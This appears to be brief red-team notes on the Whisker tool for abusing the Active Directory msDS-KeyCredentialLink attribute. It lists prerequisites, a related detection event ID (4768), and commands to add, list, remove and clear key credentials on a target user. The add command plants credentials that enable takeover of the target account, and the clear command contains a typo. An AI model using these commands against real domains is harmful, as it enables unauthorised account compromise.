### source
https://github.com/eladshamir/Whisker  

### requirements
```
Windows Server 2016 domain controller
digitale certificate for Server Authentication installed on domain controller
```

### Windows Security Log Event IDs
```
Kerberos authentication(4768) TGT requested 
```

### generate public-private key pair and add credential to target object
```
Whisker.exe add /target:<user>
```

### list entries of msDS-KeyCredentialLink attribute
```
Whisker.exe list /target:<user>
```

### remove key credential by a DeviceID GUID
```
Whisker.exe remove /target:<user> /deviceid:<id>
```

### remove all values from msDS-KeyCredentialLink attribute
```
Whisker.exe clear /target;<user>
```
